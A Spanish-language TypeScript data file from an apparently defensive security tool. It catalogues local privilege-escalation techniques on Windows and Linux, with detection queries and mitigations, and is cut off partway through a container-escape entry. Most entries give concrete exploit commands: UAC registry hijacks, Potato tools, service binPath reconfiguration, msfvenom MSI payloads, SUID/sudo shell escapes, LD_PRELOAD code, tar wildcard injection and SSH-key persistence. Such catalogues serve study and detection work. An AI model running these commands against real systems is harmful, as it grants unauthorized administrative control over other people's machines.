// attacks/priv.ts — dataset de ATAQUES de escalada de privilegios local
// (categoría 'PrivEsc').
//
// 13 técnicas: Windows (bypass UAC, familia Potato/SeImpersonate, DLL
// hijacking, servicios mal configurados, tareas programadas,
// AlwaysInstallElevated, abuso de rights de cuenta) y Linux (SUID/GTFOBins,
// sudo, kernel Dirty COW/Dirty Pipe, PATH/LD_PRELOAD, cron) + escape de
// contenedores.
//
// REGLA ANTI-DUPLICADOS: los misconfig equivalentes (servicios inseguros,
// SeBackup, AlwaysInstallElevated...) viven como FALLOS de configuración
// en ../vulnerabilities.ts (IDs PRV-*); aquí solo la TÉCNICA de
// explotación paso a paso.
//
// IDs: PRIV-001..PRIV-013. 100% offline — alimenta AttacksExplorerTool.tsx
// vía ./index.ts. Las detecciones son ejemplos de partida. No `export default`.

import type { AttackInfo } from './types';

export const PRIV_ATTACKS: AttackInfo[] = [
  {
    id: 'PRIV-001',
    nombre: 'Bypass de UAC',
    alias: ['UAC bypass', 'auto-elevate abuse', 'bypass de consentimiento UAC'],
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1548.002'],
    descripcion_tecnica: 'El usuario está en admins locales pero sus procesos corren con integridad media: UAC pide consentir para elevar. Los bypasses abusan de binarios Microsoft auto-elevate (fodhelper.exe, computerdefaults.exe, sdclt.exe, eventvwr.exe) que leen configuración del registro HKCU ANTES de elevar: el atacante sobrescribe la key que esos binarios ejecutan (ms-settings\Shell\Open\command) con su comando y el binario lo lanza high integrity sin mostrar prompt. UACME documenta ~70 variantes.',
    impacto_iam_soc: 'Convierte una sesión de admin "no elevada" en equivalente-SYSTEM de forma silenciosa (el malware evita el prompt visible que alertaría al usuario). En SOC: binarios auto-elevate con procesos padres raros y writes en HKCU\Software\Classes\ms-settings justo antes de la ejecución.',
    como_funciona: [
      'Comprobar el contexto: whoami /groups → grupo Administrators sí, integridad media (UAC no está en Always notify)',
      'Hijack de registry: reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "cmd /c start C:\\temp\\evil.exe" + DelegateExecute vacío',
      'Disparar el binario auto-elevate: fodhelper.exe / computerdefaults.exe / sdclt.exe — el proceso hereda high integrity sin prompt',
      'Automatizar por build de Windows con UACME (o SharpUAC compilado); verificar con whoami /groups post-ejecución',
    ],
    deteccion: {
      kql: 'DeviceRegistryEvents | where RegistryKey contains "ms-settings\\Shell\\Open\\command" or RegistryKey contains "Software\\Classes\\ms-settings" | project Timestamp, RegistryKey, RegistryValueData, InitiatingProcessFileName // + hijos de fodhelper/computerdefaults/sdclt',
      spl: 'index=win sourcetype=XmlWinEventLog EventCode=4688 | regex _raw="(?i)(fodhelper|computerdefaults|sdclt|eventvwr)" | stats count by host, process, parent_process',
      sigma: 'win_uac_bypass_fodhelper',
      win_event_ids: [4688, 13],
    },
    mitigacion: [
      'UAC en nivel "Always notify" para cuentas admin — asumiendo la fricción',
      'El fix real: usuarios estándar para el trabajo diario + cuentas admin separadas (PAW/LAPS para elevación puntual)',
      'AppLocker/WDAC sobre binarios auto-elevate y monitorización de las keys HKCU abusadas (ms-settings Shell\\Open\\command)',
      'Hunt: procesos hijos de fodhelper/computerdefaults/sdclt que no sean procesos del sistema',
    ],
    referencias: [
      'https://attack.mitre.org/techniques/T1548/002/',
      'https://github.com/hfiref0x/UACME',
      'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation',
    ],
  },
  {
    id: 'PRIV-002',
    nombre: 'Familia Potato (abuso de SeImpersonate)',
    alias: ['JuicyPotato', 'GodPotato', 'RottenPotato', 'SweetPotato', 'CoercedPotato'],
    categoria: 'PrivEsc',
    severidad: 'Critical',
    mitre_attack: ['T1134.001'],
    descripcion_tecnica: 'Las cuentas de servicio (IIS AppPool, SQL Server Agent, tareas programadas) corren con SeImpersonatePrivilege. La familia Potato engaña a NT AUTHORITY\\SYSTEM para que se autentique contra un listener COM/RPC del atacante (activación OLE, named pipes, coerción del Print Spooler): el atacante captura el token de acceso de SYSTEM en su listener y lo impersona en su propio proceso. Linaje: RottenPotato (2016) → JuicyPotato (Win7-2016, muerto tras el parche de 2019 que bloquea DCOM como SYSTEM) → RoguePotato/GenericPotato (Win 2019+) → SweetPotato/GodPotato (con IIS, 2022) → CoercedPotato (2024, coerción del Spooler).',
    impacto_iam_soc: 'Es el paso 2 estándar del ransomware tras un RCE web en un servicio: shell de cuenta de servicio → SYSTEM en minutos. En SOC: w3wp.exe/sqlservr.exe creando procesos raros (binarios potato, certutil, whoami) o listeners locales en puertos altos.',
    como_funciona: [
      'Verificar el privilegio: whoami /priv → SeImpersonatePrivilege presente (shell conseguido en una cuenta de servicio)',
      'Elegir potato por OS: GodPotato -cmd "cmd /c whoami" (cualquier Windows con servicio); en legacy, JuicyPotato -l 1337 -p c:\\temp\\rev.exe -t *',
      'Si las variantes RPC están parcheadas: PrintSpoofer.exe o CoercedPotato (coerción del Print Spooler hacia un named pipe propio)',
      'Aterrizar: reverse shell como SYSTEM y volcar credenciales con mimikatz (hashes, cuentas del host)',
    ],
    deteccion: {
      kql: 'DeviceProcessEvents | where (InitiatingProcessFileName in ("w3wp.exe", "sqlservr.exe", "nlsvc.exe", "MsMpEng.exe") and FileName in ("godpotato.exe", "juicypotato.exe", "rottenpotato.exe", "genericpotato.exe", "printspoofer.exe")) or ProcessCommandLine contains "potato" | project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName',
      spl: 'index=win sourcetype=XmlWinEventLog EventCode=4688 | regex _raw="(?i)(juicy|rogue|sweet|god|coerced)potato|printspoofer" | stats count by host, process',
      sigma: 'win_potato_activity',
      win_event_ids: [4688],
    },
    mitigacion: [
      'Quitar SeImpersonatePrivilege a las cuentas de servicio que no lo necesitan (GPO de derechos de usuario)',
      'Mantener parcheado: las variantes legacy mueren con los fixes de 2019+ — los hosts sin parchear siguen siendo JuicyPotato-land',
      'AppLocker/WDAC: bloquear ejecutables no firmados desde las carpetas de los servicios web',
      'Hunt: CUALQUIER proceso hijo de w3wp.exe/sqlservr.exe es sospechoso (el pool no debe spawnear shells)',
    ],
    referencias: [
      'https://attack.mitre.org/techniques/T1134/001/',
      'https://github.com/BeichenDream/GodPotato',
      'https://decoder.cloud/2017/12/23/the-lonely-potato/',
    ],
  },
  {
    id: 'PRIV-003',
    nombre: 'DLL Hijacking (y search order)',
    alias: ['DLL search order hijacking', 'DLL preloading', 'phantom DLL'],
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1574.001'],
    descripcion_tecnica: 'Windows busca las DLLs en orden: directorio del ejecutable → CWD → System32 → rutas del PATH. Si un proceso privilegiado (servicio, binario auto-elevate, herramienta de admin) carga una DLL que no existe en rutas protegidas — o que sí existe en una ruta escribible por el usuario — el atacante planta su DLL en una posición anterior del search order y el proceso la carga con sus privilegios. Variantes: DLL phantom (falta una DLL del sistema), DLL squatting (versión mal escrita), .local redirects y .manifest.',
    impacto_iam_soc: 'Ejecución como el proceso vulnerable (a menudo SYSTEM) con solo permisos de escritura en una carpeta — sin explotar ningún bug. En SOC: DLLs creadas en rutas de usuario (Sysmon 11) y cargas de DLL desde rutas anómalas (Sysmon 7).',
    como_funciona: [
      'Hunt con Process Monitor: filtrar NAME NOT FOUND / PATH NOT FOUND sobre procesos privilegiados (servicios, binarios de admin que corren al login)',
      'Plantar una DLL proxy: exporta las funciones que el proceso espera (forwarding a la real) y además ejecuta el payload en DllMain — SharpDLLHijack genera la plantilla',
      'Colocarla en la ruta ganadora: carpeta del exe si es escribible, CWD del servicio, o directorio anterior en el PATH',
      'Automatizar el hallazgo: PowerUp (Find-ProcessDLLHijack / Write-HijackDLL) o dll-hijack-audit scripts',
    ],
    deteccion: {
      kql: 'DeviceFileEvents | where ActionType == "FileCreated" and FileName endswith ".dll" and FolderPath startswith "C:\\Users\\" | project Timestamp, FileName, FolderPath, InitiatingProcessFileName // y DeviceImageLoadEvents: DLLs de rutas de usuario cargadas por procesos SYSTEM',
      spl: 'index=win sourcetype=XmlWinEventLog EventCode=11 | regex _raw="(?i)C:\\\\Users\\\\.*\\\\.(dll|local)" | stats count by host, Image',
      sigma: 'win_dll_hijack_suspicious_location (custom)',
      win_event_ids: [11, 7, 4688],
    },
    mitigacion: [
      'Servicios y apps instalados en rutas protegidas (Program Files con DACLs correctas), ejecutables con paths citados',
      'Verificar SafeDllSearchMode activo (System32 antes que CWD) y eliminar dependencias del CWD en apps legacy',
      'FIM + Sysmon 11/7: DLL creada en ruta de usuario y cargada por proceso privilegiado = alerta inmediata',
      'AppLocker/WDAC: bloquear la carga de DLLs no firmadas desde rutas de usuario',
    ],
    referencias: [
      'https://attack.mitre.org/techniques/T1574/001/',
      'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking',
    ],
  },
  {
    id: 'PRIV-004',
    nombre: 'Servicios Windows mal configurados',
    alias: ['unquoted service path', 'weak service permissions', 'servicios inseguros'],
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1574.011'],
    descripcion_tecnica: 'Tres defectos clásicos. (1) Unquoted service path: el ImagePath es C:\\Program Files\\Vendor\\X Service\\svc.exe sin comillas → Windows intenta ejecutar C:\\Program.exe: quien pueda escribir ahí gana SYSTEM al reiniciar. (2) Weak permissions: el binario del servicio es modificable por usuarios (sobrescribirlo), o el DACL del servicio permite SERVICE_CHANGE_CONFIG (reconfigurar binPath con sc config). (3) Weak service account: el servicio corre con una cuenta cuyas credenciales se extraen del registry (LSA secrets).',
    impacto_iam_soc: 'Escalada local trivial en hosts mal administrados — el clásico eterno de las auditorías internas. En SOC: cambios de ImagePath en el registry de servicios y eventos 7045/4697 con binarios en rutas de usuario o temp.',
    como_funciona: [
      'Enumerar: accesschk.exe -uwcqv "Authenticated Users" * (DACLs de servicios) y PowerUp Get-ModifiableService / winPEAS (sección de servicios)',
      'Unquoted: wmic service get name,pathname /format:list | findstr /i "Program Files" — rutas sin comillas con espacios escribibles',
      'Weak binary: sobrescribir el binario con un rev.exe (o MSF exploit/windows/local/service_permissions) y reiniciar el servicio: sc stop/sc start o reboot',
      'Weak config: sc config vulnsvc binPath= "net localgroup administrators atacante /add" && sc start vulnsvc — SYSTEM al instante',
    ],
    deteccion: {
      kql: 'DeviceRegistryEvents | where RegistryKey startswith "HKLM\\SYSTEM\\CurrentControlSet\\Services\\" and RegistryValueName == "ImagePath" and InitiatingProcessFileName !in ("sc.exe", "services.exe", "msiexec.exe", "svchost.exe", "setup.exe") | project Timestamp, RegistryKey, RegistryValueData',
      spl: 'index=win sourcetype=WinEventLog (EventCode=7045 OR EventCode=4697) | regex ImagePath="(?i)(C:\\\\Users|C:\\\\Temp|\\\\PerfLogs)" | table _time, host, EventCode, ImagePath',
      sigma: 'win_service_imagepath_change',
      win_event_ids: [7045, 4697, 4688],
    },
    mitigacion: [
      'Corregir rutas de servicios (SIEMPRE entre comillas) y DACLs del binario: solo SYSTEM/Admins escriben',
      'SERVICE_CHANGE_CONFIG y SERVICE_ALL_ACCESS solo para administradores — auditar con accesschk/SharpUp periódicamente',
      'Alertar en 7045/4697 con ImagePath fuera de Program Files/Windows: binarios en Temp/Users es rojo',
      'Cuentas de servicio gMSA/virtual accounts: sin passwords extraíbles del registry',
    ],
    referencias: [
      'https://attack.mitre.org/techniques/T1574/011/',
      'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services',
      'https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc',
    ],
  },
  {
    id: 'PRIV-005',
    nombre: 'Abuso de tareas programadas',
    alias: ['scheduled tasks abuse', 'abuso de scheduled tasks'],
    categoria: 'PrivEsc',
    severidad: 'Medium',
    mitre_attack: ['T1053.005'],
    descripcion_tecnica: 'Tareas programadas que corren como SYSTEM apuntan a un binario en disco: si la ruta o el binario es escribible por el usuario, el reemplazo gana SYSTEM en el siguiente trigger (o forzándolo con schtasks /run). La variante pura de escalada es el binario escribible; crear tareas nuevas ya exige admin. Añadido: el hijack del COM handler de tareas delegadas y las tareas de mantenimiento heredadas de imágenes doradas.',
    impacto_iam_soc: 'Escalada y persistencia a la vez: el payload se re-ejecuta solo con cada trigger. En SOC: eventos 4698/4700 con acciones hacia rutas de usuario, y cambios de hash de binarios asociados a tareas SYSTEM.',
    como_funciona: [
      'Enumerar: schtasks /query /fo LIST /v | findstr /i "Task To Run" y PowerUp Get-ModifiableScheduledTaskFile — mirar autor NT AUTHORITY\\SYSTEM',
      'Buscar binarios de tareas SYSTEM en rutas escribibles (C:\\Temp, C:\\Users\\...) — verificar ACL con icacls',
      'Reemplazar el binario (msfvenom reverse shell) y disparar: schtasks /run /tn vulnsvc — o esperar el trigger programado',
      'Sin permisos sobre el exe: DLL hijack del binario de la tarea (Process Monitor para hallar la DLL que busca en su carpeta)',
    ],
    deteccion: {
      kql: 'DeviceProcessEvents | where InitiatingProcessFileName in ("taskeng.exe", "svchost.exe", "taskhostw.exe") and (FolderPath startswith "C:\\Users" or FolderPath startswith "C:\\Temp" or ProcessCommandLine contains "C:\\Users") | project Timestamp, ProcessCommandLine // y 4698/4700 con acciones hacia rutas de usuario',
      spl: 'index=win sourcetype=WinEventLog EventCode=4698 | regex _raw="(?i)(C:\\\\Users|C:\\\\Temp|powershell -enc)" | table _time, host, EventCode',
      sigma: 'win_scheduled_task_suspicious_action (custom)',
      win_event_ids: [4698, 4700, 4688],
    },
    mitigacion: [
      'Auditar tareas SYSTEM: binarios en rutas protegidas, firmados y bajo FIM (cambio de hash = alerta)',
      'DACLs correctas en carpetas de tareas y ejecutables; prohibir C:\\Temp como home de binarios de servicio',
      'Alertar sobre 4698/4700 con acciones hacia rutas de usuario o PowerShell codificado',
      'Revisar tareas heredadas de imágenes doradas (acumulan basura ejecutable como SYSTEM)',
    ],
    referencias: [
      'https://attack.mitre.org/techniques/T1053/005/',
      'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks',
    ],
  },
  {
    id: 'PRIV-006',
    nombre: 'AlwaysInstallElevated',
    alias: ['instalación MSI como SYSTEM', 'MSI elevated install'],
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1548.002'],
    descripcion_tecnica: 'Política legacy de Windows Installer: si las keys AlwaysInstallElevated están a 1 en HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer Y en la misma ruta de HKCU, CUALQUIER .msi se instala con privilegios SYSTEM sin prompt ni credenciales. Casi siempre es una imagen dorada mal hecha o el residuo de una app de empaquetado antigua. El usuario genera el MSI malicioso y msiexec /quiet lo instala silenciosamente.',
    impacto_iam_soc: 'Usuario → SYSTEM con un doble clic (o un /quiet sin UI). Es más un defecto de configuración de imagen que un ataque sofisticado: se detecta con un baseline de registro más que con eventos. En SOC: msiexec /quiet instalando .msi desde rutas de usuario.',
    como_funciona: [
      'Comprobar: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated (y la misma key bajo HKCU) — ambas a 1 = explotable',
      'Generar: msfvenom -p windows/x64/exec CMD="net localgroup administrators atacante /add" -f msi -o /tmp/a.msi',
      'Instalar: msiexec /quiet /qn /i C:\\Users\\atacante\\Downloads\\a.msi — corre como SYSTEM sin prompt',
      'PowerUp automatiza check + exploit: Get-RegistryAlwaysInstallElevated / Write-AlwaysInstallElevated',
    ],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName == "msiexec.exe" and ProcessCommandLine matches regex "(?i)(/quiet|/qn)" and ProcessCommandLine contains "C:\\\\Users" | project Timestamp, AccountName, ProcessCommandLine',
      spl: 'index=win sourcetype=WinEventLog EventCode=4688 | regex _raw="(?i)msiexec.*(quiet|/qn).*C:\\\\Users" | stats count by host, AccountName, process',
      sigma: 'win_msiexec_quiet_install_user_path (custom)',
      win_event_ids: [4688],
    },
    mitigacion: [
      'GPO: AlwaysInstallElevated a 0 en HKLM y HKCU (y verificar en el inventario de imágenes)',
      'AppLocker: regla para msiexec que solo permita .msi firmados desde orígenes aprobados',
      'Alertar sobre 4688 de msiexec /quiet con paquetes en rutas de usuario',
      'Revisar imágenes doradas y software de empaquetado legacy (la fuente típica de la key a 1)',
    ],
    referencias: [
      'https://attack.mitre.org/techniques/T1548/002/',
      'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated',
    ],
  },
  {
    id: 'PRIV-007',
    nombre: 'Abuso de SUID / SGID (GTFOBins)',
    alias: ['SUID', 'SGID', 'setuid binaries'],
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1548.001'],
    descripcion_tecnica: 'Un binario con SUID (chmod 4000) corre con el owner del archivo (a menudo root) sin importar quién lo lance; SGID hereda el grupo. En Linux mal administrado sobran (find / -perm -4000). GTFOBins cataloga qué binarios legítimos permiten shell o escritura arbitraria: find (-exec), vim/nano (:!sh), env/bash -p, cp/tar (sobrescribir /etc/passwd), less/man (!), nmap interactive legacy, docker (equivale a root del host).',
    impacto_iam_soc: 'Root SIN explotar ningún bug: usando binarios mal configurados del propio sistema. En SOC es de lo más difícil de ver en runtime (son ejecuciones legítimas de binarios legítimos): el control real es el hunt de configuración — listado de SUID/SGID contra baseline.',
    como_funciona: [
      'Enumerar: find / -perm -4000 -type f 2>/dev/null; ls -la sobre cada uno y comparar contra GTFOBins (gtfobins.github.io)',
      'Shell directa: find /tmp -exec /bin/sh -p \\; (hereda euid root) / vim -c \':!sh\' / bash -p si bash es SUID',
      'Escritura: cp SUID permite sobrescribir /etc/passwd con una línea root propia (hash generado con openssl passwd) — o tar para leer/respaldar lo que sea',
      'Post: shell root → persistencia de acceso añadiendo clave SSH a /root/.ssh/authorized_keys',
    ],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName in ("vim", "find", "env", "cp", "tar", "nmap", "bash", "less") and (ProcessCommandLine contains "-exec" or ProcessCommandLine contains ":!sh" or ProcessCommandLine endswith " -p") | project Timestamp, AccountName, ProcessCommandLine // MDE para Linux',
      spl: 'index=linux sourcetype=auditd syscall=execve | regex exe="(/usr/bin/(vim|find|env|cp|tar|nmap|bash))" | search uid!=0 auid>1000 | stats count by host, exe, auid',
      sigma: 'linux_suid_gtfobins_execution (custom)',
    },
    mitigacion: [
      'Hunt periódico: find / -perm /6000 contra baseline — alertar sobre binarios SUID NUEVOS',
      'Quitar el bit SUID de lo que no lo necesita y montar con nosuid /home, /tmp, /var/tmp',
      'Contenedores y servicios: no-new-privileges (NO_NEW_PRIVS) mata la herencia de euid',
      'Usuario fuera del grupo docker (docker SUID equivale a root del host: ver PRIV-012)',
    ],
    referencias: [
      'https://gtfobins.github.io/',
      'https://attack.mitre.org/techniques/T1548/001/',
      'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid',
    ],
  },
  {
    id: 'PRIV-008',
    nombre: 'sudo mal configurado (y Baron Samedit)',
    alias: ['sudoers abuse', 'Baron Samedit', 'sudo misconfiguration'],
    categoria: 'PrivEsc',
    severidad: 'High',
    cve_ejemplo: ['CVE-2021-3156'],
    mitre_attack: ['T1548.003'],
    descripcion_tecnica: 'Errores de /etc/sudoers y de la cache de sudo. Los clásicos: NOPASSWD para comandos shell-capable (sudo vim, sudo find, sudo awk — GTFOBins etiqueta todos), wildcards que admiten argumentos extra (sudo less /var/log/* permite abrir cualquier cosa y :sh), sudo de interpretes/editores, o sudo su/bash directo. Aparte, CVE-2021-3156 (Baron Samedit): heap overflow en sudoedit explotable por cualquier usuario local en sudo < 1.9.5p2 → root sin ninguna mala configuración previa.',
    impacto_iam_soc: 'De usuario a root con un comando mal concedido en sudoers — o con el CVE en hosts sin parchear. En SOC: auditd execve con euid=0 (uid=0) lanzado por auid de usuario normal, y picos de fallos de autenticación sudo.',
    como_funciona: [
      'Enumerar: sudo -l (qué puede correr este usuario) y leer /etc/sudoers + /etc/sudoers.d/* (reglas NOPASSWD, wildcards)',
      'Gadget GTFOBins: sudo vim -c \':!sh\' / sudo find / -exec /bin/sh \\; / sudo awk \'BEGIN {system("/bin/sh")}\'',
      'Wildcards: sudo less /var/log/app/* → sudo less /var/log/app/../../etc/shadow → comando !sh dentro de less',
      'CVE-2021-3156: sudoedit -s "\\\\" $(printf "A=%.0s" $(seq 1 65536)) con el PoC público — root directo en sudo viejos',
    ],
    deteccion: {
      kql: 'DeviceProcessEvents | where ProcessCommandLine startswith "sudo" and FileName in ("vim", "less", "find", "awk", "bash", "su", "sudoedit") | project Timestamp, AccountName, ProcessCommandLine // MDE para Linux; auditd: execve uid=0 auid>1000',
      spl: 'index=linux sourcetype=auditd syscall=execve | search uid=0 auid>1000 | stats count by host, exe, auid, success',
      sigma: 'linux_sudo_shell_escape (custom)',
    },
    mitigacion: [
      'Auditar sudoers: NOPASSWD solo para scripts fijos con path absoluto — sin wildcards, sin editores ni interpretes',
      'Parchear sudo ≥ 1.9.5p2 (Baron Samedit es de 2021: cualquier versión vieja en producción es deuda)',
      'auditd con reglas execve y alertas de euid=0 con auid de usuario',
      'Preferir políticas simples (doas) o command whitelisting con wrappers en vez de concesiones amplias',
    ],
    referencias: [
      'https://gtfobins.github.io/',
      'https://www.sudo.ws/security/advisories/unescape_overflow/',
      'https://attack.mitre.org/techniques/T1548/003/',
    ],
  },
  {
    id: 'PRIV-009',
    nombre: 'Explotación del kernel Linux (Dirty COW / Dirty Pipe)',
    alias: ['Dirty COW', 'Dirty Pipe', 'kernel exploit'],
    categoria: 'PrivEsc',
    severidad: 'Critical',
    cve_ejemplo: ['CVE-2016-5195', 'CVE-2022-0847'],
    mitre_attack: ['T1068'],
    descripcion_tecnica: 'Bugs del kernel explotados para ejecutar código como root. Dirty COW (CVE-2016-5195): race condition en el copy-on-write permite escribir en mapeos read-only → sobrescribir /etc/passwd o binarios SUID en disco. Dirty Pipe (CVE-2022-0847): un flag del pipe no se limpia y permite escribir páginas cacheadas de archivos read-only (sin tocar el disco): parchea un SUID en memoria o inyecta una línea root en /etc/passwd. Afectaron a casi todos los kernels del momento y siguen vivos en appliances/IoT sin actualizar.',
    impacto_iam_soc: 'Root total sin ninguna configuración previa: solo hace falta kernel vulnerable y un shell local (a menudo la webshell del acceso inicial). La ejecución ocurre en userland y apenas deja firma en logs: monitorear writes a /etc/passwd y binaries que ganan SUID.',
    como_funciona: [
      'Fingerprint: uname -r + searchsploit linux kernel <versión> local privesc — o enumeración con linux-exploit-suggester',
      'Dirty Pipe (kernel 5.8–5.16.11): compilar el PoC (dirtypipe) — sobrescribe un SUID (/usr/bin/su) en page cache o añade usuario root en /etc/passwd',
      'Dirty COW (kernel < 4.8.3): PoC cowroot o dirtycow-mem (versión en memoria: el binario queda intacto)',
      'Aterrizar: shell root (su <nuevo-root>) + persistencia (clave SSH en /root/.ssh/authorized_keys) y limpieza de logs',
    ],
    deteccion: {
      kql: 'DeviceFileEvents | where FileName in ("/etc/passwd", "/etc/shadow") and ActionType == "FileModified" and InitiatingProcessFileName !in ("useradd", "passwd", "chpasswd", "vipw", "usermod") | project Timestamp, FileName, InitiatingProcessFileName // MDE para Linux',
      spl: 'index=linux sourcetype=auditd | regex _raw="(?i)/etc/(passwd|shadow)" | search success=yes | stats count by host, exe, auid | where auid > 1000',
      sigma: 'linux_etc_passwd_modified (custom)',
    },
    mitigacion: [
      'Parchear el kernel (Dirty Pipe cerrado en 5.16.11, COW en 4.8.3): los exploits siguen funcionando porque los hosts no se actualizan',
      'Inventario de kernels/appliances legacy (IoT, network gear) — donde estos bugs viven para siempre',
      'FIM sobre /etc/passwd y alertas de modificación por procesos no gestionados',
      'Reducir superficie: usuarios sin compiladores, contenedores con seccomp y no-new-privileges',
    ],
    referencias: [
      'https://nvd.nist.gov/vuln/detail/CVE-2016-5195',
      'https://dirtypipe.cm4all.com/',
      'https://attack.mitre.org/techniques/T1068/',
    ],
  },
  {
    id: 'PRIV-010',
    nombre: 'Hijacking de PATH y LD_PRELOAD',
    alias: ['PATH hijacking', 'LD_PRELOAD abuse', 'library hijacking'],
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1574.007', 'T1574.006'],
    descripcion_tecnica: 'PATH: si un proceso privilegiado (script de sudo, cron, wrapper setuid) invoca un comando SIN ruta absoluta, el atacante crea un binario con ese nombre en un directorio anterior del PATH (o en el propio directorio de trabajo) y el proceso root lo ejecuta. LD_PRELOAD: la variable fuerza cargar una librería propia ANTES que las del sistema — el constructor de la lib se ejecuta con los privilegios del proceso (si sudo preserva la variable: env_keep, o si /etc/ld.so.preload es escribible).',
    impacto_iam_soc: 'Root con un script casero: binarios fake en el PATH y .so con constructor cargado por procesos root. En SOC: procesos root ejecutando binarios de /tmp o /home, cambios en /etc/ld.so.preload y LD_PRELOAD visible en auditd.',
    como_funciona: [
      'Detectar: revisar scripts privilegiados (sudo -l, /etc/cron*) que llaman comandos sin / (cat, tar, ps, backup) y revisar echo $PATH del entorno de root',
      'PATH: crear /home/user/cat con shebang y "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash" → PATH=/home/user:$PATH al lanzarse el script root',
      'LD_PRELOAD: preload.c con __attribute__((constructor)) system("chmod u+s /bin/bash") → gcc -shared -fPIC -o /tmp/preload.so && sudo LD_PRELOAD=/tmp/preload.so <cmd permitido>',
      '/etc/ld.so.preload escribible: meter la .so global (todo proceso la carga — root + persistencia total)',
    ],
    deteccion: {
      kql: 'DeviceProcessEvents | where ProcessCommandLine matches regex "(?i)(PATH=[^\\"]*(/tmp|/home)|LD_PRELOAD)" or ProcessCommandLine contains "ld.so.preload" | project Timestamp, AccountName, ProcessCommandLine // MDE para Linux',
      spl: 'index=linux sourcetype=auditd | regex _raw="(?i)(LD_PRELOAD|/etc/ld\\.so\\.preload|PATH=[^\"]*(/tmp|/home))" | stats count by host, exe, auid',
      sigma: 'linux_ld_preload_path_hijack (custom)',
    },
    mitigacion: [
      'Scripts privilegiados con rutas absolutas SIEMPRE (/usr/bin/tar, no tar) y sin depender del entorno del usuario',
      'sudo: env_reset activo (nunca env_keep con LD_PRELOAD/PATH); /etc/ld.so.preload solo root-writable',
      'auditd/Sysmon for Linux: alertar sobre execve de root con paths relativos o LD_PRELOAD en el entorno',
      'Contenedores: no ejecutar binarios root desde paths escribibles por usuarios',
    ],
    referencias: [
      'https://attack.mitre.org/techniques/T1574/007/',
      'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload',
    ],
  },
  {
    id: 'PRIV-011',
    nombre: 'Abuso de cron',
    alias: ['cron jobs abuse', 'wildcard injection', 'abuso de crontab'],
    categoria: 'PrivEsc',
    severidad: 'Medium',
    mitre_attack: ['T1053.003'],
    descripcion_tecnica: 'Root ejecuta scripts de /etc/cron.d, cron.daily o crontab propio sin sanear el entorno. Si el SCRIPT (o su directorio) es escribible por el usuario, el payload corre como root. Otras vías: comandos sin ruta absoluta en un PATH mínimo de cron, y el wildcard injection — un script root hace tar czf backup.tar.gz * en un directorio escribible: los archivos --checkpoint=1 y --checkpoint-action=exec=sh\\exploit.sh se interpretan como OPCIONES de tar y ejecutan comandos como root.',
    impacto_iam_soc: 'Root con paciencia: el payload espera al siguiente trigger (minutos u hora). En SOC: procesos root ejecutando scripts de /home//tmp (pspy lo revela en vivo) y cambios en /etc/cron* y /var/spool/cron.',
    como_funciona: [
      'Enumerar: ls -la /etc/cron* /var/spool/cron/crontabs; cat /etc/crontab — y correr pspy64 para VER en vivo qué ejecuta root',
      'Script root escribible: añadir una línea (reverse shell o chmod u+s sobre una copia de bash) y esperar el trigger',
      'Wildcard injection: touch -- "--checkpoint=1" y "--checkpoint-action=exec=sh\\exploit.sh" en el directorio del tar czf * del script de backup',
      'PATH del cron: script que llama "backup.sh" sin path → plantar /home/user/backup.sh que se ejecuta como root',
    ],
    deteccion: {
      kql: 'DeviceProcessEvents | where InitiatingProcessFileName in ("cron", "crond") and (FolderPath startswith "/home/" or FolderPath startswith "/tmp/" or ProcessCommandLine contains "--checkpoint") | project Timestamp, ProcessCommandLine // MDE para Linux',
      spl: 'index=linux sourcetype=auditd | regex _raw="(?i)(--checkpoint|/var/spool/cron|/home/.*/cron)" | stats count by host, exe, auid // y FIM sobre /etc/cron*',
      sigma: 'linux_cron_script_user_path (custom)',
    },
    mitigacion: [
      'Scripts de cron: ownership root, permisos 600/700, sin directorios escribibles y rutas absolutas en TODO',
      'FIM + alertas sobre cambios en /etc/cron* y /var/spool/cron',
      'Nunca wildcards en comandos ejecutados por root (tar *) — listas explícitas o -- separador de opciones',
      'Hunt con pspy: procesos root desde rutas de usuario es rojo inmediato',
    ],
    referencias: [
      'https://attack.mitre.org/techniques/T1053/003/',
      'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs',
    ],
  },
  {
    id: 'PRIV-012',
    nombre: 'Escape de contenedores',
    alias: ['container escape', 'container breakout', 'docker escape'],
    categoria: 'PrivEsc',
    severidad: 'Critical',
    cve_ejemplo: ['CVE-2019-5736'],
    mitre_attack: ['T1611'],
    descripcion_tecnica: 'El contenedor NO es aislamiento de seguridad completo por defecto. Vectores: (1) /var/run/docker.sock montado o usuario en el grupo docker: la API del dockerd permite crear un contenedor privilegiado montando el disco del host (/dev/sda1 → chroot → root real). (2) --privileged: todas las capabilities + devices accesibles: escape vía cgroup release_agent, /proc/sysrq-trigger o mount del filesystem del host. (3) runc CVE-2019-5736: sobrescribir el binario runc del host desde dentro del contenedor (FD de /proc/self/exe durante un exec). (4) En K8s: hostPath /, capabilities peligrosas (CAP_SYS_ADMIN, CAP_SYS_PTRACE) o pods con privileged: true.',
